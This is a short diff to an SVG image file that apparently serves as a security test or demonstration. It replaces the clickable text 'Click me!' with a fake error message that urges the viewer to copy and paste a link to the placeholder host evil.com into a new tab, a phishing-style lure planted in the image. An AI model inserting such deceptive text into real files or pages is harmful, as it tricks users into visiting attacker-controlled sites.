@@ -7,5 +7,5 @@
         ]]>
     </script>
     <rect width="100%" height="100%" fill="lightblue" />
-    <text x="50" y="50" font-family="Verdana" font-size="35" fill="black" onclick="handleClick()">Click me!</text>
+    <text x="50" y="50" font-family="Verdana" font-size="35" fill="black" onclick="handleClick()">ERROR - Please to continue copy and paste this link in a new tab evil.com</text>
 </svg>
